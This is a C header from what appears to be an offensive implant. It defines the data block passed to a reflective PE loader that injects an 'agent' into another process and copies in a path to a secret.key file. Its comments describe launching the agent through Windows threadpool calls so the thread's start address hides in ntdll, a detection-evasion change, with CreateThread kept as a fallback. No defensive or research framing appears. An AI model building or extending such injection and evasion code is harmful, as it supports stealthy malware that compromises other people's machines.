/*
 * client/loader.h — RflData structure shared between loader.c and inject.c
 */
#pragma once
#ifndef CLIENT_LOADER_H
#define CLIENT_LOADER_H

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <windows.h>

/*
 * RflData — passed as the thread argument to the reflective loader.
 * All fields are filled by auto_migrate() before injection.
 */
#pragma pack(push,1)
typedef struct _RflData {
    /* Raw PE bytes (read from disk, written into the target allocation) */
    unsigned char *pRawPE;
    unsigned int   rawSize;

    /* RVA of AgentRun() within the PE image */
    unsigned int   agentRunRva;

    /* Offset and size of g_key_path in the image's .data section */
    unsigned int   gKeyPathOffset;  /* RVA of g_key_path[]              */
    unsigned int   gKeyPathSize;    /* sizeof(g_key_path) = MAX_PATH*2  */

    /* Absolute path to secret.key — copied into g_key_path after mapping */
    char           keyPath[MAX_PATH * 2];

    /* Win32 API pointers (resolved in our process, same VA in target) */
    LPVOID  (WINAPI *pVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
    BOOL    (WINAPI *pVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD); /* F-6 */
    BOOL    (WINAPI *pFlushInstructionCache)(HANDLE, LPCVOID, SIZE_T);
    HMODULE (WINAPI *pLoadLibraryA)(LPCSTR);
    FARPROC (WINAPI *pGetProcAddress)(HMODULE, LPCSTR);
    /*
     * F-6: pCreateThread replaced by threadpool pointers.
     * The loader now submits AgentRun via TpAllocWork + TpPostWork so the
     * spawned thread starts in ntdll!TppWorkerThread rather than directly
     * at AgentRun.  CreateThread is kept as a fallback pointer in case the
     * threadpool call fails.
     */
    PVOID   (WINAPI *pTpAllocWork)(PVOID /*PTP_WORK_CALLBACK*/, PVOID, PVOID);
    VOID    (WINAPI *pTpPostWork)(PVOID /*PTP_WORK*/);
    VOID    (WINAPI *pTpReleaseWork)(PVOID /*PTP_WORK*/);
    HANDLE  (WINAPI *pCreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T,
                                    LPTHREAD_START_ROUTINE, LPVOID,
                                    DWORD, LPDWORD);
    BOOL    (WINAPI *pCloseHandle)(HANDLE);
} RflData;
#pragma pack(pop)

/* The loader function itself — exported for size measurement */
DWORD WINAPI rfl_loader(RflData *pData);
void         rfl_loader_end(void);

#endif /* CLIENT_LOADER_H */
